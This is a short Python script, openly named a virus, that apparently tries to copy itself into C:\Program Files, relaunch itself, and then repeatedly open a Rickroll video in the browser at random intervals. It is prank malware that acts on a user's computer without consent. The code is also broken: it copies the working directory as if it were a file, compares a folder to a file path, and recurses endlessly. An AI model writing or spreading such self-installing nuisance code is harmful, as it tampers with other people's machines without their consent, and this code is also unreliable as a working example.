import time
import random
import webbrowser
import subprocess
import os
import shutil

def rick():
    time.sleep(10)
    if random.random() < 0.1:
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    rick()

def installer():
    path = os.path.join("C:\\", "Program Files", "Inconspicuous_virus", "Inconspicuous_virus.py")
    if not os.getcwd()==path:
        os.mkdir(os.path.join("C:\\", "Program Files", "Inconspicuous_virus"))
        if shutil.copyfile(os.getcwd(), path):
            subprocess.run("python {}".format(path))
        else:
            installer()
    else:
        rick()

installer()